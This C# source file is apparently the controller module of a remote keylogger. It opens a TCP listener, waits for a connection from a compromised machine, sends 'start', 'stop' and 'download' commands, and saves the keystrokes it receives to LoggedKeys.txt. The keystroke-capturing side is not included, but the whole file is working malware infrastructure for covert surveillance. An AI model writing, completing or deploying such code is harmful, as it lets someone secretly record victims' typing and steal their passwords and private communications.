using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Keylogger
{


    class Keylogger
    {
        Socket tcpSocket = null;


        public TcpListener prepareReceiver(string ip, int port)
        {
            IPAddress ipaddress = IPAddress.Parse(ip);
            TcpListener listener = new TcpListener(ipaddress, port);
            try
            {
                listener.Start();
            }
            catch (Exception e) {

                System.Console.WriteLine(e.Message);
                return null;
            }
                return listener;
        }

        public void receiveConnection(TcpListener listener)
        {
            
            while (true)
            {
                if (listener.Pending())
                {
                        tcpSocket = listener.AcceptSocket();
                        return;
                        
                }
            }
        }


        static void Main(string[] args)
        {

            Keylogger kl = new Keylogger();
            TcpListener listener = kl.prepareReceiver(args[0], Convert.ToInt16(args[1]));
            if (listener == null)
            {
                System.Console.ReadKey();
                Environment.Exit(1);           
            }
            kl.receiveConnection(listener);
            byte[] loggedKeys = new byte[10485760];
            String stringedKeys = "";
            while (true)
            {
                System.Console.WriteLine("Welcome to the keylogger module.");
                System.Console.WriteLine("start");
                System.Console.WriteLine("stop");
                System.Console.WriteLine("download");
                String command = System.Console.ReadLine();

                if (!command.Equals("start") && !command.Equals("stop") && !command.Equals("download"))
                {
                    System.Console.WriteLine("Invalid option");
                    continue;
                }

                try{

                    kl.tcpSocket.Send(Encoding.ASCII.GetBytes("1 " + command));

                }catch(Exception e){

                   System.Console.WriteLine(e.Message);
                   kl.receiveConnection(listener);
                   continue;
                }

                int readBytes;

                if(command.Equals("download")){
                   try{
                        readBytes = kl.tcpSocket.Receive(loggedKeys);
                   }catch(Exception e){

                         System.Console.WriteLine(e.Message);
                         kl.receiveConnection(listener);
                         continue;
                   }

                   try
                   {
                       stringedKeys = Encoding.ASCII.GetString(loggedKeys, 0, readBytes);
                   }
                   catch (Exception e) {

                       System.Console.WriteLine(e.Message);
                       continue;
                   }
  
                    try
                    {
                        File.AppendAllText(".\\LoggedKeys.txt", stringedKeys, Encoding.ASCII);
                    }
                    catch (Exception e) { System.Console.WriteLine(e.Message); }
                }

                if (command.Equals("stop")) {   //what if it's closed on cross?

                    kl.tcpSocket.Close();
                    Environment.Exit(0);           
                }
            }



        }
    }
}
